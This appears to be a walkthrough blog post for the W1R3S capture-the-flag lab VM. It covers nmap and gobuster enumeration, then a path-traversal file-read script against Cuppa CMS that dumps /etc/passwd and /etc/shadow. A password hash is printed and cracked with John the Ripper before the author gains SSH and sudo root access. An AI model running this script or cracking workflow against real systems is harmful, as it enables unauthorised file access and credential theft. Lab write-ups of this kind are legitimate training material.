## Background

Someone hires you to do a penetration test on the W1R3S.inc individual server and report all findings. They ask you to gain `root` access and find the flag (located in `/root` directory).

## Information Gathering

Let's kick this off with a `nmap` scan to establish the services available in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.100.130
...
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 64 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23 11:21 content
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23 11:25 docs

```

As usual, let's go with directory/file enumeration on the web service and see what we get.

### Directory/File Enumeration

I like to use `gobuster` with one of the big directory wordlists.

```
Gobuster v1.1                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.100.130/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307
[+] Expanded     : true
=====================================================
http://192.168.100.130/administrator (Status: 301)
http://192.168.100.130/javascript (Status: 301)
http://192.168.100.130/wordpress (Status: 301)
=====================================================
```

OK. We find two interesting directories: `administrator` and `wordpress`.

### Cuppa CMS

The `administrator` directory turns out to be the installation setup for Cuppa CMS. This is how it looks like when I point the browser to `/administrator`.

![screenshot-1](/assets/images/posts/w1r3s-1.0.1-walkthrough/screenshot-1.png)

According to the official [documentation](https://www.cuppacms.com/en/docs/installation), in order for the installation to complete, it will have to create the database first.

>Remember, the database should be created before to install Cuppa CMS.

The Cuppa CMS installation was never completed in the first place or I'll not be seeing the setup page. I downloaded a [copy](http://cuppacms.com/files/cuppa_cms.zip) of the Cuppa CMS code to see if I can discover any vulnerabilities.

I'm not sure if this is a new vulnerability but it's a pleasant surprise to find an LFI vulnerability in `alertConfigField.php` at line 77.

![screenshot-2](/assets/images/posts/w1r3s-1.0.1-walkthrough/screenshot-2.png)

To test it, I wrote `cat.sh`, a simple script that will display any file as long as there's permission to do so.

<div class="filename"><span>cat.sh</span></div>
```bash
#!/bin/bash

_HOST=192.168.100.130
_PATH=administrator/alerts/alertConfigField.php
_PARM=urlConfig
_TRAV=../../../../../../../..

curl -s --data-urlencode "${_PARM}=${_TRAV}$1" $_HOST/$_PATH \
| sed -r 's/^ {8}//' \
| sed '71,$!d' \
| sed '$d' \
| sed '$d'
```

Let's give it a shot and see what we get.

```
# ./cat.sh /etc/passwd
...
w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false
mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false
```
Imagine my surprise when I request for `/etc/shadow` and it shows up in the output.

```
# ./cat.sh /etc/shadow
...
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
sshd:*:17554:0:99999:7:::
ftp:*:17554:0:99999:7:::
mysql:!:17554:0:99999:7:::
```

I'm not sure if `/etc/shadow` is intentionally made world-readable; it should not be the case.

### John the Ripper

With both `passwd` and `shadow` available, I can `unshadow` them, and send them to `john` for offline cracking with a wordlist like "rockyou".

The cracking completes in seconds.

```
# john --format=crypt --show hashes.txt
w1r3s:computer:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
```

I can now log in to the box via SSH with the cracked password.

## Privilege Escalation

It isn't long before I see that `w1r3s` is on the `sudoers` list.

![screenshot-4](/assets/images/posts/w1r3s-1.0.1-walkthrough/screenshot-4.png)

Becoming `root` is another command away.

## Afterthought

To be honest, I didn't even bother with WordPress. :stuck_out_tongue_winking_eye:
